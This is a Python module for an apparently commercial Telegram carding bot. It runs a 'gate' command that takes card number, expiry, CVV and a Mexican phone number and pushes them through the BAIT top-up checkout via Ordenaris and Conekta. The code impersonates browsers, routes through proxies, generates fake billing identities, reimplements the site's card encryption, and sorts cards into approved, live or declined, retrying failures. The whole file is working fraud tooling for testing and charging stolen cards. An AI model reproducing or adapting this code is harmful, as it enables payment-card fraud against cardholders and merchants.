# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
# Usage: /ps CC|MM|YY|CVV PHONE [monto]
# phone: BAIT MX 10 digits (required for individual use)
# monto: 50, 100, 200, 300, 500 (default: 100)
import random, json, re, base64, hashlib, os, types, secrets, string
from faker import Faker
from curl_cffi import requests as curl
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, AES
from Crypto.Util.Padding import pad
from Commands.Gates._template import run_gate, DIV
from Commands.jill import error as _err

_BAIT_MONTOS = [(50, '🟢'), (100, '🟢'), (200, '🟡'), (300, '🔴'), (500, '🔴')]

def _bait_kbd(bot, card_s=None, phone=None):
    if card_s and phone:
        flat = [bot.addButton(f"{e} ${a}", callback=f"ps_monto {a}|{card_s}|{phone}") for a, e in _BAIT_MONTOS]
    else:
        flat = [bot.addButton(f"{e} ${a}", callback=f"ps_monto {a}") for a, e in _BAIT_MONTOS]
    return bot.replyMarkup(bot.addRow(*flat[:3]), bot.addRow(*flat[3:]))

def _mask(card_s):
    n = card_s.split('|')[0] if '|' in card_s else card_s
    return f"{n[:6]}·····{n[-4:]}" if len(n) > 10 else f"{n[:4]}···"

_GATEWAY = 'BAIT Recargas (Ordenaris/Conekta)'

PAYMENTS_UUID = 'a4af312f84e111ee87cf0242ac120002'
ORD_SERVICIO  = 'c020013d66c411ee92c10242ac120002'
ORD_ORIGEN    = 'https://mibait.com'
CONEKTA_AUTH  = 'Basic a2V5X2M0THdvYXBJOG5tWm9LZXJ1UEhuTFJUOg=='

PLAN_MAP      = {50: '1', 100: '2', 200: '2', 300: '2', 500: '2'}
OFFERING_MAP  = {50: '1809906702', 100: '1809906704', 200: '1809906708', 300: '1809906734', 500: '1809908013'}
DURATION_MAP  = {50: 15, 100: 15, 200: 30, 300: 30, 500: 30}
PLAN_NAME_MAP = {50: 'Mi Bait $50', 100: 'Mi Bait $100', 200: 'Mi Bait $200', 300: 'Mi Bait $300', 500: 'Mi Bait $500'}

_FALLBACK_PHONE = '4625298371'

_ORDENARIS_B64 = (
    "MIIDIjANBgkqhkiG9w0BAQEFAAOCAw8AMIIDCgKCAwEA6XIAFr5musTkKX38qy5h"
    "lD/Nv3CXxkBIsHsTdxdFSl3l+BPm1aG3tfganVhZV3sPpdujPnHxSAgNt4CTgkDc"
    "mdgv9gkgA9Jpshv5JEFHWLoA1wqZSUzctYG6iUgV0a31nwYgZGCtbZDQxupJRaWd"
    "vdVbCVNYVPUezu+pCQsLLt2za8m9aMLj4NKYHtewZ51oPrpxgL7bGse0Hw3KcUEF"
    "D59kKNZSEkXH1U9O96bgAAlboPKCTJjUIxbByQ2dKtQRFAil1DqhZd+Uf2YE/6GV"
    "buhIz+NDCf6UUg1EzVIttowcNSYBT6/gDtKof/b4wbd+k5+RdISSUb1QxBTJCNK2"
    "dZISH99iG/J+Dv+UB0FDgxWrDsQR/MOAgNrdxYPYRWZ05T14eONusHfWTbKf/Z/d"
    "1t3LkDaS3Ip/iTn0iYi/k3U88gE2BF7E+ycr46+FQA2Iv/pgdeQhxuB3TiFxdhWL"
    "i7l9SnOZpompnD/tmSamSVY0twkHRWuWqhgkj3YnL+9qAurZDGYVF2bmH1Neax44"
    "Ox27+b19iF9M50Rr6P/OyFhH9zuAwFpzr41yivrDu3Xi2WUjwOVeZHJ8le7CtNcD4"
    "PR2byn9YGsRB75NiTTp1T0YL7werTRYsN12UJ2b0qHL/Xamcezu+oU6MGTPWtTQ+p"
    "mDfMc3feCV6ivSgdsD2nJFiopCWliP3mLLMMd+Cvx738/C8H8Td9U1ZgtMpfDerf0"
    "8LN6nZ8rXPGd2y1OLnhS31XygR7cTWsBzjmE9RqcVtR+OM3FKlYuJjVYXQ4gVQfs"
    "MpNik76Sxjm7ync8HnflzGzs+MIJLRNWcvleT4amENWeT49dtLm94NxvNL7ZEWQ/"
    "Sl2IepgijJs+/tqGk0OXh4iHgJEqEMrMp5d/13PbERN/+0sRLLV2+tmzr4BwFsRP"
    "ig+78El619JnYV0q/Bd66VGbpteSeu9BNF9u9s6rhbAYuuSFB6i8n40k/fVxrMl7v"
    "5C2c5NG9+IAS7ZJAXhG9YwuJactkgMmehLN4p4f3AgMBAAE="
)

_CONEKTA_PEM = (
    "-----BEGIN PUBLIC KEY-----\n"
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjet2Jm4iPJTqDlW64tEG\n"
    "I9/dJTJAcn3OQdHrEwNXCz0/Rewqcv/Hm+V0klsUiS9h2W5CLC42q6wGhtl9Buu5\n"
    "vefuLVyxc8klEEjrSz/5AgfZ4HvzatbVX0KQhHI1j+caOjatDHM/ih13Rj7HIJFn\n"
    "AcutRB9vyFiCVluqRhlB9/64sqGtVmxJAir7WJp4TmpPvSEqeGKQIb80Tq+FYY7f\n"
    "tpMxQpsBT8B6y4Kn95ZfDH72H3yJezs/mExVB3M/OCBg+xt/c3dXp65JsbS482c4\n"
    "KhkxxHChNn1Y/nZ8kFYzakRGhh0BMqkvkqtAwcQJK1xPx2jRELS1vj7OFfMR+3ms\n"
    "SQIDAQAB\n"
    "-----END PUBLIC KEY-----"
)


def _build_pem(b64: str) -> str:
    lines = "\n".join(b64[i:i+64] for i in range(0, len(b64), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----"


_ORD_KEY     = RSA.import_key(_build_pem(_ORDENARIS_B64))
_CONEKTA_KEY = RSA.import_key(_CONEKTA_PEM)


class Utility:
    EMAIL_DOMAINS  = ('gmail.com', 'outlook.com')
    extractBetween = staticmethod(lambda text, s, e: text.split(s)[1].split(e)[0])

    @staticmethod
    def generateFakeProfile() -> types.SimpleNamespace:
        fake, p    = Faker("en_US"), Faker("en_US").profile()
        firstName  = p['name'].split()[0]
        lastName   = p['name'].split()[-1]
        password   = (f"{''.join(secrets.choice(string.ascii_uppercase) for _ in range(2))}"
                      f"{''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))}"
                      f"{''.join(secrets.choice(string.digits) for _ in range(3))}@")
        return types.SimpleNamespace(
            status=True, f_name=firstName, l_name=lastName,
            username=f"{firstName}{lastName}{random.randint(0,999):03}",
            password=password,
            mail=f"{firstName}{random.choice('._-')}{lastName}{random.randint(0,999)}@{random.choice(Utility.EMAIL_DOMAINS)}",
            state=fake.state(), city=fake.city(), zipcode=fake.postcode(),
            street=f"{fake.building_number()} {fake.street_name()}",
        )

    @staticmethod
    def parseCard(text: str) -> dict:
        number, month, year, cvv = re.split(r'\s*[|/]\s*|\s+', text.strip())
        year  = year[-2:] if len(year) == 4 else year
        ctype = {'4': 'VISA', '5': 'MASTERCARD', '3': 'AMEX', '6': 'DISCOVER'}
        return {'number': number, 'month': month.zfill(2), 'year': year, 'cvv': cvv,
                'type': ctype.get(number[0], 'VISA')}

    @staticmethod
    def buildPhoneData(phone: str) -> str:
        digits = re.sub(r"\D", "", str(phone or ""))
        digits = digits.removeprefix("00").removeprefix("+52").removeprefix("52")
        if len(digits) != 10:
            raise ValueError(f"Número inválido: {digits}")
        return digits

    @staticmethod
    def ordenarisCse(payload: dict) -> str:
        cipher = PKCS1_v1_5.new(_ORD_KEY)
        return base64.b64encode(base64.b64encode(
            cipher.encrypt(json.dumps(payload, separators=(',', ':')).encode())
        )).decode()

    @staticmethod
    def llaveroCse(payload: dict, pubkey) -> str:
        cipher = PKCS1_v1_5.new(pubkey)
        return base64.b64encode(base64.b64encode(
            cipher.encrypt(json.dumps(payload, separators=(',', ':')).encode())
        )).decode()

    @staticmethod
    def conektaTokenize(card: dict) -> dict:
        passphrase = os.urandom(16).hex().encode()
        salt       = os.urandom(8)

        def evp_bytes_to_key(pwd, slt, kl=32, il=16):
            d, d_i = b'', b''
            while len(d) < kl + il:
                d_i = hashlib.md5(d_i + pwd + slt).digest()
                d += d_i
            return d[:kl], d[kl:kl + il]

        key, iv    = evp_bytes_to_key(passphrase, salt)
        card_json  = json.dumps({'card': {'number': card['number'], 'name': card.get('name', ''),
                                          'exp_year': card['year'], 'exp_month': card['month'],
                                          'cvc': card['cvv'], 'device_fingerprint': ''}},
                                separators=(',', ':'))
        ciphertext = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(card_json.encode(), 16))
        inner_data = base64.b64encode(b"Salted__" + salt + ciphertext).decode()
        inner_key  = base64.b64encode(PKCS1_v1_5.new(_CONEKTA_KEY).encrypt(passphrase)).decode()
        return {'data': base64.b64encode(inner_data.encode()).decode(),
                'key':  base64.b64encode(inner_key.encode()).decode()}

    @staticmethod
    def loadLlavero(llavero_b64: str):
        priv = RSA.import_key(base64.b64decode(llavero_b64))
        return priv, priv.publickey()


def processBillingFlow(cardInput: str, phone: str, monto: str = "100", proxy=None, retries: int = 0) -> dict:
    model  = curl.Session(impersonate=random.choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios"]))
    data   = Utility.generateFakeProfile()
    card   = Utility.parseCard(cardInput)
    card['name'] = f"{data.f_name} {data.l_name}"
    number = Utility.buildPhoneData(phone)
    model.proxies = ({"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None)

    precio      = int(monto)
    plan_code   = PLAN_MAP.get(precio, '2')
    offering_id = OFFERING_MAP.get(precio, '1809906704')
    plan_name   = PLAN_NAME_MAP.get(precio, f'Mi Bait ${monto}')
    duracion    = DURATION_MAP.get(precio, 15)
    card_str    = f"{card['number']}|{card['month']}|20{card['year']}|{card['cvv']}"
    service     = {'plan': f'BAIT Recarga ${monto} MXN', 'price': precio, 'duration': f"{duracion} días"}

    try:
        model.get('https://mibait.com/recargas')

        headers2 = {'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
                    'ordServicio': ORD_SERVICIO, 'app-version': '3.15.0',
                    'origen': ORD_ORIGEN, 'Content-Type': 'application/json',
                    'Origin': ORD_ORIGEN, 'Referer': 'https://mibait.com/recargas'}
        request2 = model.post('https://mibait.com/api/core/servicio/resources/pagos/recarga',
                              headers=headers2, json={'uuid': PAYMENTS_UUID})
        if not request2.json().get('success'):
            raise Exception(f"recarga init failed: {request2.text[:150]}")
        llavero_priv, llavero_pub = Utility.loadLlavero(request2.json()['llavero'])
        ord_cliente = request2.json()['ordCliente']

        headers3 = {'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Content-Type': 'application/json', 'Origin': ORD_ORIGEN,
                    'Referer': 'https://mibait.com/'}
        payload3 = {'data': Utility.ordenarisCse({'tienda': ord_cliente, 'canal': PAYMENTS_UUID,
                                                  'telefono': number, 'precio': str(precio),
                                                  'correo': data.mail})}
        request3 = model.post('https://pagos.ordenaris.com/v2/service/angular/get-payment-method?pp-bk=true&v=1.2.0',
                              headers=headers3, json=payload3)
        if not request3.json().get('success'):
            raise Exception(f"get-payment-method failed: {request3.text[:150]}")

        def _dec(b):
            return PKCS1_v1_5.new(llavero_priv).decrypt(
                base64.b64decode(base64.b64decode(b)), b'\xff' * 8
            )
        checkout_pubkey = RSA.import_key(
            _dec(request3.json()['informacion']['config']['info']) +
            _dec(request3.json()['informacion']['config']['data'])
        )

        headers4 = {'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'es-419,es;q=0.9', 'Content-Type': 'application/json',
                    'Authorization': CONEKTA_AUTH, 'x-source': 'component-tokenizer',
                    'Origin': 'https://pay.conekta.com', 'Referer': 'https://pay.conekta.com/'}
        payload4      = Utility.conektaTokenize(card)
        request4      = model.post('https://pay.conekta.com/api/tokens', headers=headers4, json=payload4)
        conekta_token = request4.json().get('id', '')
        if not conekta_token:
            raise Exception(f"Conekta token failed: {request4.text[:150]}")

        headers5 = {'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Content-Type': 'application/json', 'ordCliente': ord_cliente,
                    'ordOrigen': ORD_ORIGEN, 'Origin': ORD_ORIGEN, 'Referer': 'https://mibait.com/'}
        payload5 = {
            'data':  Utility.llaveroCse({'divisa': 'MXN', 'nombre': data.f_name, 'apellido': data.l_name,
                                         'direccion': data.street, 'colonia': '', 'codigoPostal': data.zipcode,
                                         'ciudad': data.city, 'estado': data.state, 'pais': ''}, checkout_pubkey),
            'extra': Utility.llaveroCse({'venta': {'uuid': offering_id, 'telefono': number,
                                                    'nombre': 'Cliente Bait', 'correo': data.mail,
                                                    'precio': precio, 'total': precio, 'cantidad': 1,
                                                    'descripcion': plan_name, 'vigencia': duracion, 'imagen': '',
                                                    'logged': 'No', 'referencia1': number, 'referencia2': offering_id,
                                                    'referencia3': precio, 'referencia4': 'mbb', 'referencia5': data.mail,
                                                    'campania': {'source': None, 'medium': None, 'campaign': None, 'content': None}}},
                                        checkout_pubkey),
            'info':  Utility.llaveroCse({'envio': {}}, checkout_pubkey),
            'meta':  Utility.llaveroCse({'token': conekta_token, 'recurrente': False, 'tokenizar': False}, checkout_pubkey),
        }
        request5 = model.post(f'https://pagos.ordenaris.com/v2/service/angular/{PAYMENTS_UUID}/{plan_code}/checkout?v=1.2.0',
                              headers=headers5, json=payload5)
        j5  = request5.json()
        msg = str(j5.get('mensaje') or j5.get('message') or request5.text).strip()

        if j5.get('success'):
            return {'status': True, 'success': True, 'card': card_str, 'response': 'APPROVED',
                    'apiResponse': 'Approved ✅', 'service': service, 'retries': retries, 'gateway': _GATEWAY}
        elif re.match(r'^(36)\s', msg):
            return {'status': True, 'success': True, 'card': card_str, 'response': msg,
                    'apiResponse': 'Live Card 🟢', 'service': service, 'retries': retries, 'gateway': _GATEWAY}
        else:
            if "55 Ocurrió un error en el procesamiento de tu pago, favor de intentar nuevamente en 15 minutos" in msg:
                msg = "55 Ocurrio un error en el procesamiento de tu pago, intente con otro metodo de pago"
            return {'status': True, 'success': False, 'card': card_str, 'response': msg,
                    'apiResponse': 'Declined ❌', 'service': service, 'retries': retries, 'gateway': _GATEWAY}

    except Exception as Error:
        if retries <= 3:
            return processBillingFlow(cardInput, phone, monto, proxy, retries + 1)
        return {'status': False, 'success': False, 'card': card_str,
                'response': str(Error)[:200], 'apiResponse': 'Max Retries ❌',
                'service': service, 'retries': retries, 'gateway': _GATEWAY}


def _checker(cc, binData, phone=None, monto='100', proxy=None):
    try:
        card_input = f"{cc[0]}|{cc[1]}|{cc[2]}|{cc[3]}"
        phone_use  = phone or (cc[4] if len(cc) > 4 else _FALLBACK_PHONE)
        r   = processBillingFlow(cardInput=card_input, phone=phone_use, monto=monto, proxy=proxy)
        svc = r.get('service', {})
        api = r.get('apiResponse', '')
        msg = r.get('response', '')
        pln = svc.get('plan', '')
        full = f"{api} | {msg}" + (f' | {pln}' if pln else '')
        return {'status': True, 'success': r.get('success', False), 'response': full[:200]}
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def gateCmd(bot, update, gestion):
    raw   = bot.cmd.args or ''
    if update.reply_to and not raw:
        raw = update.reply_to.text or ''
    parts  = raw.strip().split()
    card_s = parts[0] if parts else ''
    phone  = parts[1] if len(parts) > 1 else None
    monto  = parts[2] if len(parts) > 2 else None

    if not card_s:
        return bot.replyMessage(text=_err('Use: /ps CC|MM|YY|CVV PHONE [monto]'))
    if not phone:
        return bot.replyMessage(text=_err('Phone required: /ps CC|MM|YY|CVV PHONE [monto]'))

    if not monto:
        return bot.replyMessage(
            text=(
                f"{bot.bi('BAIT Recargas')} [ 🍹 ]\n{DIV}\n"
                f"💳 {bot.bi('Card')}: <code>{_mask(card_s)}</code>\n"
                f"📱 {bot.bi('Phone')}: <code>{phone}</code>\n{DIV}\n"
                f"💰 {bot.bi('Selecciona el monto')}:"
            ),
            reply_markup=_bait_kbd(bot, card_s=card_s, phone=phone)
        )

    def _ck(cc, binData):
        return _checker(cc, binData, phone=phone, monto=monto)

    orig = bot.cmd.args
    bot.cmd.args = card_s
    try:
        run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_ck)
    finally:
        bot.cmd.args = orig


def ps_monto_cb(bot, update, gestion):
    monto = bot.callback.args.strip()
    if not monto:
        return

    card_s = ''
    phone  = ''

    tokens = monto.split('|')
    if len(tokens) == 6:
        monto  = tokens[0]
        card_s = f"{tokens[1]}|{tokens[2]}|{tokens[3]}|{tokens[4]}"
        phone  = tokens[5]
    else:
        original = (update.message or '').strip()
        orig_tokens = original.split()
        if orig_tokens and orig_tokens[0].startswith('/'):
            orig_tokens = orig_tokens[1:]
        card_s = orig_tokens[0] if orig_tokens else ''
        phone  = orig_tokens[1] if len(orig_tokens) > 1 else ''

    if monto not in [str(m[0]) for m in _BAIT_MONTOS] or not card_s or not phone:
        return bot.showAlert('Sesión expirada, usa /ps de nuevo', update.query_id, True)

    bot.showAlert(f'${monto} MXN seleccionado', update.query_id, False)

    bot.cmd = types.SimpleNamespace(command='ps', args=card_s)

    def _ck(cc, binData):
        return _checker(cc, binData, phone=phone, monto=monto)

    run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_ck)


def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    proxy = (ctx.get('proxy') or '') or None
    r = _checker(cc, bin_data, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌',
            'response': r.get('response', '')}

# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
